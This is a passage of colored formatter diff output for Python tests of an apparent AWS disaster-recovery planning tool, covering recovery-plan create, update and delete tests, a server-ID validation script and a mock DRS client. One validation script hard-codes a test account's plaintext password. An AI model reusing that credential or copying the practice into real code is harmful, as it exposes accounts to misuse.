headers=headers)\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+    headers = {\"Authorization\": f\"Bearer {token}\"}\u001b[0m\n\u001b[32m+    pg_response = requests.get(\u001b[0m\n\u001b[32m+        f\"{API_ENDPOINT}/protection-groups\", headers=headers\u001b[0m\n\u001b[32m+    )\u001b[0m\n\u001b[32m+\u001b[0m\n     if pg_response.status_code != 200:\n         print(f\"\u274c Failed to get Protection Groups: {pg_response.status_code}\")\n         return None, False\n\u001b[31m-    \u001b[0m\n\u001b[31m-    pgs = pg_response.json().get('groups', [])\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    pgs = pg_response.json().get(\"groups\", [])\u001b[0m\n\u001b[32m+\u001b[0m\n     # Find our three PGs\n\u001b[31m-    web_pg = next((pg for pg in pgs if pg['name'] == 'WebServers'), None)\u001b[0m\n\u001b[31m-    app_pg = next((pg for pg in pgs if pg['name'] == 'AppServers'), None)\u001b[0m\n\u001b[31m-    db_pg = next((pg for pg in pgs if pg['name'] == 'DatabaseServers'), None)\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+    web_pg = next((pg for pg in pgs if pg[\"name\"] == \"WebServers\"), None)\u001b[0m\n\u001b[32m+    app_pg = next((pg for pg in pgs if pg[\"name\"] == \"AppServers\"), None)\u001b[0m\n\u001b[32m+    db_pg = next((pg for pg in pgs if pg[\"name\"] == \"DatabaseServers\"), None)\u001b[0m\n\u001b[32m+\u001b[0m\n     if not all([web_pg, app_pg, db_pg]):\n         print(\"\u274c Missing required Protection Groups\")\n         print(f\"   Found: {[pg['name'] for pg in pgs]}\")\n         return None, False\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(f\"\u2705 Found WebServers: {len(web_pg['sourceServerIds'])} servers\")\n     print(f\"\u2705 Found AppServers: {len(app_pg['sourceServerIds'])} servers\")\n     print(f\"\u2705 Found DatabaseServers: {len(db_pg['sourceServerIds'])} servers\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Create Recovery Plan\n     print(\"\\n\ud83d\udcdd Step 2: Creating Recovery Plan...\")\n     create_payload = {\n         \"PlanName\": \"TEST\",\n         \"Description\": \"Automated E2E test plan\",\n\u001b[36m@@ -83,239 +84,245 @@\u001b[0m\n             {\n                 \"WaveId\": \"wave-0\",\n                 \"WaveName\": \"Web\",\n                 \"WaveDescription\": \"Web servers wave\",\n                 \"ExecutionOrder\": 0,\n\u001b[31m-                \"ProtectionGroupId\": web_pg['protectionGroupId'],\u001b[0m\n\u001b[31m-                \"ServerIds\": web_pg['sourceServerIds'],  # All 2 servers\u001b[0m\n\u001b[31m-                \"ExecutionType\": \"sequential\",\u001b[0m\n\u001b[31m-                \"Dependencies\": []\u001b[0m\n\u001b[32m+                \"ProtectionGroupId\": web_pg[\"protectionGroupId\"],\u001b[0m\n\u001b[32m+                \"ServerIds\": web_pg[\"sourceServerIds\"],  # All 2 servers\u001b[0m\n\u001b[32m+                \"ExecutionType\": \"sequential\",\u001b[0m\n\u001b[32m+                \"Dependencies\": [],\u001b[0m\n             },\n             {\n                 \"WaveId\": \"wave-1\",\n                 \"WaveName\": \"App\",\n                 \"WaveDescription\": \"Application servers wave\",\n                 \"ExecutionOrder\": 1,\n\u001b[31m-                \"ProtectionGroupId\": app_pg['protectionGroupId'],\u001b[0m\n\u001b[31m-                \"ServerIds\": app_pg['sourceServerIds'],  # All 2 servers\u001b[0m\n\u001b[31m-                \"ExecutionType\": \"sequential\",\u001b[0m\n\u001b[31m-                \"Dependencies\": [{\"DependsOnWaveId\": \"wave-0\"}]\u001b[0m\n\u001b[32m+                \"ProtectionGroupId\": app_pg[\"protectionGroupId\"],\u001b[0m\n\u001b[32m+                \"ServerIds\": app_pg[\"sourceServerIds\"],  # All 2 servers\u001b[0m\n\u001b[32m+                \"ExecutionType\": \"sequential\",\u001b[0m\n\u001b[32m+                \"Dependencies\": [{\"DependsOnWaveId\": \"wave-0\"}],\u001b[0m\n             },\n             {\n                 \"WaveId\": \"wave-2\",\n                 \"WaveName\": \"Database\",\n                 \"WaveDescription\": \"Database servers wave\",\n                 \"ExecutionOrder\": 2,\n\u001b[31m-                \"ProtectionGroupId\": db_pg['protectionGroupId'],\u001b[0m\n\u001b[31m-                \"ServerIds\": db_pg['sourceServerIds'],  # All 2 servers\u001b[0m\n\u001b[31m-                \"ExecutionType\": \"sequential\",\u001b[0m\n\u001b[31m-                \"Dependencies\": [{\"DependsOnWaveId\": \"wave-1\"}]\u001b[0m\n\u001b[31m-            }\u001b[0m\n\u001b[31m-        ]\u001b[0m\n\u001b[32m+                \"ProtectionGroupId\": db_pg[\"protectionGroupId\"],\u001b[0m\n\u001b[32m+                \"ServerIds\": db_pg[\"sourceServerIds\"],  # All 2 servers\u001b[0m\n\u001b[32m+                \"ExecutionType\": \"sequential\",\u001b[0m\n\u001b[32m+                \"Dependencies\": [{\"DependsOnWaveId\": \"wave-1\"}],\u001b[0m\n\u001b[32m+            },\u001b[0m\n\u001b[32m+        ],\u001b[0m\n     }\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     create_response = requests.post(\n\u001b[31m-        f'{API_ENDPOINT}/recovery-plans',\u001b[0m\n\u001b[31m-        headers=headers,\u001b[0m\n\u001b[31m-        json=create_payload\u001b[0m\n\u001b[31m-    )\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+        f\"{API_ENDPOINT}/recovery-plans\", headers=headers, json=create_payload\u001b[0m\n\u001b[32m+    )\u001b[0m\n\u001b[32m+\u001b[0m\n     if create_response.status_code not in [200, 201]:\n         print(f\"\u274c Failed to create plan: {create_response.status_code}\")\n         print(f\"   Response: {create_response.text}\")\n         return None, False\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     plan = create_response.json()\n\u001b[31m-    plan_id = plan.get('id') or plan.get('PlanId')\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+    plan_id = plan.get(\"id\") or plan.get(\"PlanId\")\u001b[0m\n\u001b[32m+\u001b[0m\n     print(f\"\u2705 Created Recovery Plan: {plan_id}\")\n     print(f\"   Name: TEST\")\n     print(f\"   Waves: 3\")\n     print(f\"   - Wave 0 (Web): {len(web_pg['sourceServerIds'])} servers\")\n     print(f\"   - Wave 1 (App): {len(app_pg['sourceServerIds'])} servers\")\n     print(f\"   - Wave 2 (Database): {len(db_pg['sourceServerIds'])} servers\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Store PGs for next test\n     return {\n\u001b[31m-        'plan_id': plan_id,\u001b[0m\n\u001b[31m-        'web_pg': web_pg,\u001b[0m\n\u001b[31m-        'app_pg': app_pg,\u001b[0m\n\u001b[31m-        'db_pg': db_pg\u001b[0m\n\u001b[32m+        \"plan_id\": plan_id,\u001b[0m\n\u001b[32m+        \"web_pg\": web_pg,\u001b[0m\n\u001b[32m+        \"app_pg\": app_pg,\u001b[0m\n\u001b[32m+        \"db_pg\": db_pg,\u001b[0m\n     }, True\n\u001b[32m+\u001b[0m\n \n def test_2_update_recovery_plan(token, test_data):\n     \"\"\"\n     Test 2: Update Recovery Plan\n     Remove one server from each wave\n     \"\"\"\n     print(\"\\n\" + \"=\" * 60)\n     print(\"TEST 2: UPDATE RECOVERY PLAN\")\n     print(\"=\" * 60)\n\u001b[31m-    \u001b[0m\n\u001b[31m-    plan_id = test_data['plan_id']\u001b[0m\n\u001b[31m-    web_pg = test_data['web_pg']\u001b[0m\n\u001b[31m-    app_pg = test_data['app_pg']\u001b[0m\n\u001b[31m-    db_pg = test_data['db_pg']\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    plan_id = test_data[\"plan_id\"]\u001b[0m\n\u001b[32m+    web_pg = test_data[\"web_pg\"]\u001b[0m\n\u001b[32m+    app_pg = test_data[\"app_pg\"]\u001b[0m\n\u001b[32m+    db_pg = test_data[\"db_pg\"]\u001b[0m\n\u001b[32m+\u001b[0m\n     print(f\"\\n\ud83d\udcdd Updating plan {plan_id}...\")\n     print(\"   Removing 1 server from each wave\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Update with one server removed from each wave\n     update_payload = {\n         \"PlanName\": \"TEST\",\n         \"Description\": \"Updated - one server removed per wave\",\n         \"Waves\": [\n             {\n                 \"WaveId\": \"wave-0\",\n                 \"WaveName\": \"Web\",\n                 \"WaveDescription\": \"Web servers wave (1 server)\",\n                 \"ExecutionOrder\": 0,\n\u001b[31m-                \"ProtectionGroupId\": web_pg['protectionGroupId'],\u001b[0m\n\u001b[31m-                \"ServerIds\": [web_pg['sourceServerIds'][0]],  # Only first server\u001b[0m\n\u001b[31m-                \"ExecutionType\": \"sequential\",\u001b[0m\n\u001b[31m-                \"Dependencies\": []\u001b[0m\n\u001b[32m+                \"ProtectionGroupId\": web_pg[\"protectionGroupId\"],\u001b[0m\n\u001b[32m+                \"ServerIds\": [\u001b[0m\n\u001b[32m+                    web_pg[\"sourceServerIds\"][0]\u001b[0m\n\u001b[32m+                ],  # Only first server\u001b[0m\n\u001b[32m+                \"ExecutionType\": \"sequential\",\u001b[0m\n\u001b[32m+                \"Dependencies\": [],\u001b[0m\n             },\n             {\n                 \"WaveId\": \"wave-1\",\n                 \"WaveName\": \"App\",\n                 \"WaveDescription\": \"Application servers wave (1 server)\",\n                 \"ExecutionOrder\": 1,\n\u001b[31m-                \"ProtectionGroupId\": app_pg['protectionGroupId'],\u001b[0m\n\u001b[31m-                \"ServerIds\": [app_pg['sourceServerIds'][0]],  # Only first server\u001b[0m\n\u001b[31m-                \"ExecutionType\": \"sequential\",\u001b[0m\n\u001b[31m-                \"Dependencies\": [{\"DependsOnWaveId\": \"wave-0\"}]\u001b[0m\n\u001b[32m+                \"ProtectionGroupId\": app_pg[\"protectionGroupId\"],\u001b[0m\n\u001b[32m+                \"ServerIds\": [\u001b[0m\n\u001b[32m+                    app_pg[\"sourceServerIds\"][0]\u001b[0m\n\u001b[32m+                ],  # Only first server\u001b[0m\n\u001b[32m+                \"ExecutionType\": \"sequential\",\u001b[0m\n\u001b[32m+                \"Dependencies\": [{\"DependsOnWaveId\": \"wave-0\"}],\u001b[0m\n             },\n             {\n                 \"WaveId\": \"wave-2\",\n                 \"WaveName\": \"Database\",\n                 \"WaveDescription\": \"Database servers wave (1 server)\",\n                 \"ExecutionOrder\": 2,\n\u001b[31m-                \"ProtectionGroupId\": db_pg['protectionGroupId'],\u001b[0m\n\u001b[31m-                \"ServerIds\": [db_pg['sourceServerIds'][0]],  # Only first server\u001b[0m\n\u001b[31m-                \"ExecutionType\": \"sequential\",\u001b[0m\n\u001b[31m-                \"Dependencies\": [{\"DependsOnWaveId\": \"wave-1\"}]\u001b[0m\n\u001b[31m-            }\u001b[0m\n\u001b[31m-        ]\u001b[0m\n\u001b[32m+                \"ProtectionGroupId\": db_pg[\"protectionGroupId\"],\u001b[0m\n\u001b[32m+                \"ServerIds\": [\u001b[0m\n\u001b[32m+                    db_pg[\"sourceServerIds\"][0]\u001b[0m\n\u001b[32m+                ],  # Only first server\u001b[0m\n\u001b[32m+                \"ExecutionType\": \"sequential\",\u001b[0m\n\u001b[32m+                \"Dependencies\": [{\"DependsOnWaveId\": \"wave-1\"}],\u001b[0m\n\u001b[32m+            },\u001b[0m\n\u001b[32m+        ],\u001b[0m\n     }\n\u001b[31m-    \u001b[0m\n\u001b[31m-    headers = {'Authorization': f'Bearer {token}'}\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    headers = {\"Authorization\": f\"Bearer {token}\"}\u001b[0m\n     update_response = requests.put(\n\u001b[31m-        f'{API_ENDPOINT}/recovery-plans/{plan_id}',\u001b[0m\n\u001b[32m+        f\"{API_ENDPOINT}/recovery-plans/{plan_id}\",\u001b[0m\n         headers=headers,\n\u001b[31m-        json=update_payload\u001b[0m\n\u001b[31m-    )\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+        json=update_payload,\u001b[0m\n\u001b[32m+    )\u001b[0m\n\u001b[32m+\u001b[0m\n     if update_response.status_code != 200:\n         print(f\"\u274c Failed to update plan: {update_response.status_code}\")\n         print(f\"   Response: {update_response.text}\")\n         return False\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(f\"\u2705 Updated Recovery Plan successfully\")\n     print(f\"   - Wave 0 (Web): 1 server (removed 1)\")\n     print(f\"   - Wave 1 (App): 1 server (removed 1)\")\n     print(f\"   - Wave 2 (Database): 1 server (removed 1)\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     return True\n \n\u001b[32m+\u001b[0m\n def test_3_delete_recovery_plan(token, test_data):\n     \"\"\"\n     Test 3: Delete Recovery Plan\n     \"\"\"\n     print(\"\\n\" + \"=\" * 60)\n     print(\"TEST 3: DELETE RECOVERY PLAN\")\n     print(\"=\" * 60)\n\u001b[31m-    \u001b[0m\n\u001b[31m-    plan_id = test_data['plan_id']\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    plan_id = test_data[\"plan_id\"]\u001b[0m\n\u001b[32m+\u001b[0m\n     print(f\"\\n\ud83d\uddd1\ufe0f  Deleting plan {plan_id}...\")\n\u001b[31m-    \u001b[0m\n\u001b[31m-    headers = {'Authorization': f'Bearer {token}'}\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    headers = {\"Authorization\": f\"Bearer {token}\"}\u001b[0m\n     delete_response = requests.delete(\n\u001b[31m-        f'{API_ENDPOINT}/recovery-plans/{plan_id}',\u001b[0m\n\u001b[31m-        headers=headers\u001b[0m\n\u001b[31m-    )\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+        f\"{API_ENDPOINT}/recovery-plans/{plan_id}\", headers=headers\u001b[0m\n\u001b[32m+    )\u001b[0m\n\u001b[32m+\u001b[0m\n     if delete_response.status_code not in [200, 204]:\n         print(f\"\u274c Failed to delete plan: {delete_response.status_code}\")\n         print(f\"   Response: {delete_response.text}\")\n         return False\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(f\"\u2705 Deleted Recovery Plan successfully\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Verify deletion\n     print(\"\\n\ud83d\udd0d Verifying deletion...\")\n     get_response = requests.get(\n\u001b[31m-        f'{API_ENDPOINT}/recovery-plans/{plan_id}',\u001b[0m\n\u001b[31m-        headers=headers\u001b[0m\n\u001b[31m-    )\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+        f\"{API_ENDPOINT}/recovery-plans/{plan_id}\", headers=headers\u001b[0m\n\u001b[32m+    )\u001b[0m\n\u001b[32m+\u001b[0m\n     if get_response.status_code == 404:\n         print(\"\u2705 Plan confirmed deleted (404 Not Found)\")\n         return True\n     else:\n         print(f\"\u26a0\ufe0f  Plan still exists: {get_response.status_code}\")\n         return False\n \n\u001b[32m+\u001b[0m\n def main():\n     print(\"=\" * 60)\n     print(\"RECOVERY PLAN E2E TEST SUITE\")\n     print(\"=\" * 60)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Authenticate\n     print(\"\\n\ud83d\udd10 Authenticating...\")\n     token = get_auth_token()\n     if not token:\n         print(\"\u274c Authentication failed\")\n         sys.exit(1)\n     print(\"\u2705 Authenticated successfully\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Test 1: Create\n     test_data, success = test_1_create_recovery_plan(token)\n     if not success:\n         print(\"\\n\u274c TEST 1 FAILED - Aborting remaining tests\")\n         sys.exit(1)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Wait and get fresh token for update\n     time.sleep(1)\n     print(\"\\n\ud83d\udd10 Getting fresh token for Test 2...\")\n     token = get_auth_token()\n     if not token:\n         print(\"\u274c Token refresh failed\")\n         sys.exit(1)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Test 2: Update\n     success = test_2_update_recovery_plan(token, test_data)\n     if not success:\n         print(\"\\n\u274c TEST 2 FAILED\")\n         # Try to cleanup\n         print(\"\\n\ud83e\uddf9 Attempting cleanup...\")\n         test_3_delete_recovery_plan(token, test_data)\n         sys.exit(1)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Wait and get fresh token for delete\n     time.sleep(1)\n     print(\"\\n\ud83d\udd10 Getting fresh token for Test 3...\")\n     token = get_auth_token()\n     if not token:\n         print(\"\u274c Token refresh failed\")\n         sys.exit(1)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Test 3: Delete\n     success = test_3_delete_recovery_plan(token, test_data)\n     if not success:\n         print(\"\\n\u274c TEST 3 FAILED\")\n         sys.exit(1)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Final Summary\n     print(\"\\n\" + \"=\" * 60)\n     print(\"\u2705 ALL E2E TESTS PASSED!\")\n     print(\"=\" * 60)\n     print(\"\\nTest Results:\")\n     print(\"  \u2705 Test 1: Create Recovery Plan with 3 waves\")\n     print(\"  \u2705 Test 2: Update Recovery Plan (remove servers)\")\n     print(\"  \u2705 Test 3: Delete Recovery Plan\")\n     print(\"\\n\" + \"=\" * 60)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     sys.exit(0)\n \n\u001b[31m-if __name__ == '__main__':\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+if __name__ == \"__main__\":\u001b[0m\n     main()\n\u001b[1m--- tests/python/unit/test_infrastructure_smoke.py\t2025-11-19 22:57:38.302874+00:00\u001b[0m\n\u001b[1m+++ tests/python/unit/test_infrastructure_smoke.py\t2026-01-02 15:49:03.540973+00:00\u001b[0m\n\u001b[36m@@ -33,15 +33,17 @@\u001b[0m\n @pytest.mark.unit\n def test_moto_mocking():\n     \"\"\"Verify moto AWS mocking works.\"\"\"\n     import boto3\n     from moto import mock_dynamodb\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     with mock_dynamodb():\n         dynamodb = boto3.resource(\"dynamodb\", region_name=\"us-east-1\")\n         table = dynamodb.create_table(\n             TableName=\"test-table\",\n             KeySchema=[{\"AttributeName\": \"id\", \"KeyType\": \"HASH\"}],\n\u001b[31m-            AttributeDefinitions=[{\"AttributeName\": \"id\", \"AttributeType\": \"S\"}],\u001b[0m\n\u001b[31m-            BillingMode=\"PAY_PER_REQUEST\"\u001b[0m\n\u001b[32m+            AttributeDefinitions=[\u001b[0m\n\u001b[32m+                {\"AttributeName\": \"id\", \"AttributeType\": \"S\"}\u001b[0m\n\u001b[32m+            ],\u001b[0m\n\u001b[32m+            BillingMode=\"PAY_PER_REQUEST\",\u001b[0m\n         )\n         assert table.table_name == \"test-table\"\n\u001b[1m--- tests/python/test_drs_validation.py\t2025-11-21 02:56:07.795215+00:00\u001b[0m\n\u001b[1m+++ tests/python/test_drs_validation.py\t2026-01-02 15:49:03.548550+00:00\u001b[0m\n\u001b[36m@@ -16,87 +16,90 @@\u001b[0m\n USERNAME = \"testuser@example.com\"\n PASSWORD = \"IiG2b1o+D$\"\n \n # Authenticate\n print(\"\ud83d\udd10 Authenticating...\")\n\u001b[31m-cognito = boto3.client('cognito-idp', region_name=REGION)\u001b[0m\n\u001b[32m+cognito = boto3.client(\"cognito-idp\", region_name=REGION)\u001b[0m\n auth_response = cognito.initiate_auth(\n     ClientId=USER_POOL_CLIENT_ID,\n\u001b[31m-    AuthFlow='USER_PASSWORD_AUTH',\u001b[0m\n\u001b[31m-    AuthParameters={'USERNAME': USERNAME, 'PASSWORD': PASSWORD}\u001b[0m\n\u001b[32m+    AuthFlow=\"USER_PASSWORD_AUTH\",\u001b[0m\n\u001b[32m+    AuthParameters={\"USERNAME\": USERNAME, \"PASSWORD\": PASSWORD},\u001b[0m\n )\n\u001b[31m-token = auth_response['AuthenticationResult']['IdToken']\u001b[0m\n\u001b[31m-headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}\u001b[0m\n\u001b[32m+token = auth_response[\"AuthenticationResult\"][\"IdToken\"]\u001b[0m\n\u001b[32m+headers = {\u001b[0m\n\u001b[32m+    \"Authorization\": f\"Bearer {token}\",\u001b[0m\n\u001b[32m+    \"Content-Type\": \"application/json\",\u001b[0m\n\u001b[32m+}\u001b[0m\n \n\u001b[31m-print(\"\\n\" + \"=\"*70)\u001b[0m\n\u001b[32m+print(\"\\n\" + \"=\" * 70)\u001b[0m\n print(\"TEST 1: Verify FAKE Server IDs Are REJECTED\")\n\u001b[31m-print(\"=\"*70)\u001b[0m\n\u001b[32m+print(\"=\" * 70)\u001b[0m\n \n fake_payload = {\n     \"GroupName\": \"FakeGroup\",\n     \"Region\": \"us-east-1\",\n     \"Description\": \"Test with fake servers\",\n     \"AccountId\": \"123456789012\",\n\u001b[31m-    \"sourceServerIds\": [\"i-fakeid001\", \"i-fakeid002\"]  # Fake EC2-style IDs\u001b[0m\n\u001b[32m+    \"sourceServerIds\": [\"i-fakeid001\", \"i-fakeid002\"],  # Fake EC2-style IDs\u001b[0m\n }\n \n print(f\"\\n\ud83d\udce4 Attempting to create PG with FAKE server IDs...\")\n print(f\"   Server IDs: {fake_payload['sourceServerIds']}\")\n \n response = requests.post(\n\u001b[31m-    f\"{API_ENDPOINT}/protection-groups\",\u001b[0m\n\u001b[31m-    headers=headers,\u001b[0m\n\u001b[31m-    json=fake_payload\u001b[0m\n\u001b[32m+    f\"{API_ENDPOINT}/protection-groups\", headers=headers, json=fake_payload\u001b[0m\n )\n \n print(f\"\\n\ud83d\udce5 Response: {response.status_code}\")\n print(f\"   Body: {response.text}\")\n \n if response.status_code == 400:\n     print(\"\\n\u2705 SUCCESS! Fake server IDs were REJECTED as expected\")\n else:\n     print(f\"\\n\u274c FAILED! Expected 400 error, got {response.status_code}\")\n \n\u001b[31m-print(\"\\n\" + \"=\"*70)\u001b[0m\n\u001b[32m+print(\"\\n\" + \"=\" * 70)\u001b[0m\n print(\"TEST 2: Verify REAL Server IDs Are ACCEPTED\")\n\u001b[31m-print(\"=\"*70)\u001b[0m\n\u001b[32m+print(\"=\" * 70)\u001b[0m\n \n # Get real DRS servers\n print(\"\\n\ud83d\udd0d Getting real DRS servers...\")\n\u001b[31m-drs = boto3.client('drs', region_name='us-east-1')\u001b[0m\n\u001b[32m+drs = boto3.client(\"drs\", region_name=\"us-east-1\")\u001b[0m\n servers_response = drs.describe_source_servers()\n\u001b[31m-real_servers = [s['sourceServerID'] for s in servers_response.get('items', [])][:2]\u001b[0m\n\u001b[32m+real_servers = [\u001b[0m\n\u001b[32m+    s[\"sourceServerID\"] for s in servers_response.get(\"items\", [])\u001b[0m\n\u001b[32m+][:2]\u001b[0m\n \n print(f\"   Found {len(real_servers)} servers: {real_servers}\")\n \n real_payload = {\n     \"GroupName\": \"RealGroup-Test\",\n\u001b[31m-    \"Region\": \"us-east-1\", \u001b[0m\n\u001b[32m+    \"Region\": \"us-east-1\",\u001b[0m\n     \"Description\": \"Test with real DRS servers\",\n     \"AccountId\": \"123456789012\",\n\u001b[31m-    \"sourceServerIds\": real_servers\u001b[0m\n\u001b[32m+    \"sourceServerIds\": real_servers,\u001b[0m\n }\n \n print(f\"\\n\ud83d\udce4 Attempting to create PG with REAL server IDs...\")\n response = requests.post(\n\u001b[31m-    f\"{API_ENDPOINT}/protection-groups\",\u001b[0m\n\u001b[31m-    headers=headers,\u001b[0m\n\u001b[31m-    json=real_payload\u001b[0m\n\u001b[32m+    f\"{API_ENDPOINT}/protection-groups\", headers=headers, json=real_payload\u001b[0m\n )\n \n print(f\"\\n\ud83d\udce5 Response: {response.status_code}\")\n if response.status_code == 201:\n     pg_data = response.json()\n\u001b[31m-    pg_id = pg_data.get('protectionGroupId')\u001b[0m\n\u001b[32m+    pg_id = pg_data.get(\"protectionGroupId\")\u001b[0m\n     print(f\"   Created PG: {pg_id}\")\n     print(\"\\n\u2705 SUCCESS! Real server IDs were ACCEPTED\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Clean up\n     print(f\"\\n\ud83e\uddf9 Cleaning up test PG...\")\n\u001b[31m-    requests.delete(f\"{API_ENDPOINT}/protection-groups/{pg_id}\", headers=headers)\u001b[0m\n\u001b[32m+    requests.delete(\u001b[0m\n\u001b[32m+        f\"{API_ENDPOINT}/protection-groups/{pg_id}\", headers=headers\u001b[0m\n\u001b[32m+    )\u001b[0m\n else:\n     print(f\"   Body: {response.text}\")\n     print(f\"\\n\u274c FAILED! Expected 201 created, got {response.status_code}\")\n \n\u001b[31m-print(\"\\n\" + \"=\"*70)\u001b[0m\n\u001b[32m+print(\"\\n\" + \"=\" * 70)\u001b[0m\n print(\"VALIDATION TESTS COMPLETE\")\n\u001b[31m-print(\"=\"*70)\u001b[0m\n\u001b[32m+print(\"=\" * 70)\u001b[0m\n\u001b[1m--- tests/python/mocks/mock_drs_client.py\t2025-11-19 23:06:23.392855+00:00\u001b[0m\n\u001b[1m+++ tests/python/mocks/mock_drs_client.py\t2026-01-02 15:49:03.579494+00:00\u001b[0m\n\u001b[36m@@ -8,91 +8,95 @@\u001b[0m\n from datetime import datetime, timedelta\n \n \n class ThrottlingException(Exception):\n     \"\"\"Simulates DRS API throttling error.\"\"\"\n\u001b[32m+\u001b[0m\n     pass\n \n \n class ResourceNotFoundException(Exception):\n     \"\"\"Simulates DRS resource not found error.\"\"\"\n\u001b[32m+\u001b[0m\n     pass\n \n \n class ValidationException(Exception):\n     \"\"\"Simulates DRS validation error.\"\"\"\n\u001b[32m+\u001b[0m\n     pass\n \n \n class ServiceUnavailableException(Exception):\n     \"\"\"Simulates DRS service unavailable error.\"\"\"\n\u001b[32m+\u001b[0m\n     pass\n \n \n class MockDRSClient:\n     \"\"\"\n     Mock DRS client that simulates AWS Elastic Disaster Recovery API.\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     Supports:\n     - describe_source_servers with realistic responses\n     - start_recovery with job ID generation\n     - describe_jobs with status transitions (PENDING \u2192 IN_PROGRESS \u2192 COMPLETED)\n     - Throttling and error simulation\n     \"\"\"\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def __init__(\n         self,\n         simulate_throttling: bool = False,\n         throttle_after_calls: int = 10,\n         simulate_errors: bool = False,\n\u001b[31m-        error_rate: float = 0.0\u001b[0m\n\u001b[32m+        error_rate: float = 0.0,\u001b[0m\n     ):\n         \"\"\"\n         Initialize mock DRS client.\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         Args:\n             simulate_throttling: Enable throttling simulation\n             throttle_after_calls: Number of calls before throttling\n             simulate_errors: Enable random error simulation\n             error_rate: Probability of errors (0.0 to 1.0)\n         \"\"\"\n         self.simulate_throttling = simulate_throttling\n         self.throttle_after_calls = throttle_after_calls\n         self.simulate_errors = simulate_errors\n         self.error_rate = error_rate\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Track API calls for throttling simulation\n         self.call_count = 0\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Mock data stores\n         self.source_servers: Dict[str, Dict[str, Any]] = {}\n         self.recovery_jobs: Dict[str, Dict[str, Any]] = {}\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Initialize with default test servers\n         self._initialize_test_servers()\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def _initialize_test_servers(self):\n         \"\"\"Initialize mock source servers for testing.\"\"\"\n         test_servers = [\n             \"s-3d75cdc0d9a28a725\",\n             \"s-3afa164776f93ce4f\",\n             \"s-3c1730a9e0771ea14\",\n             \"s-3c63bb8be30d7d071\",\n             \"s-3578f52ef3bdd58b4\",\n\u001b[31m-            \"s-3b9401c1cd270a7a8\"\u001b[0m\n\u001b[32m+            \"s-3b9401c1cd270a7a8\",\u001b[0m\n         ]\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         for server_id in test_servers:\n             self.source_servers[server_id] = {\n                 \"sourceServerID\": server_id,\n                 \"arn\": f\"arn:aws:drs:us-east-1:123456789012:source-server/{server_id}\",\n                 \"tags\": {},\n                 \"dataReplicationInfo\": {\n                     \"dataReplicationState\": \"CONTINUOUS\",\n                     \"dataReplicationInitiation\": {\n                         \"startDateTime\": \"2025-01-01T00:00:00Z\"\n\u001b[31m-                    }\u001b[0m\n\u001b[32m+                    },\u001b[0m\n                 },\n                 \"lastLaunchResult\": \"NOT_STARTED\",\n                 \"lifeCycle\": {\n                     \"addedToServiceDateTime\": \"2025-01-01T00:00:00Z\"\n                 },\n\u001b[36m@@ -107,106 +111,109 @@\u001b[0m\n                     \"networkInterfaces\": [\n                         {\"ips\": [\"10.0.1.100\"], \"isPrimary\": True}\n                     ],\n                     \"os\": {\"fullString\": \"Microsoft Windows Server 2019\"},\n                     \"ramBytes\": 8589934592,\n\u001b[31m-                    \"recommendedInstanceType\": \"t3.large\"\u001b[0m\n\u001b[31m-                }\u001b[0m\n\u001b[32m+                    \"recommendedInstanceType\": \"t3.large\",\u001b[0m\n\u001b[32m+                },\u001b[0m\n             }\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def _check_throttling(self):\n         \"\"\"Check if request should be throttled.\"\"\"\n         if self.simulate_throttling:\n             self.call_count += 1\n             if self.call_count > self.throttle_after_calls:\n                 self.call_count = 0  # Reset for next cycle\n                 raise ThrottlingException(\"Rate exceeded\")\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def _check_random_error(self):\n         \"\"\"Simulate random 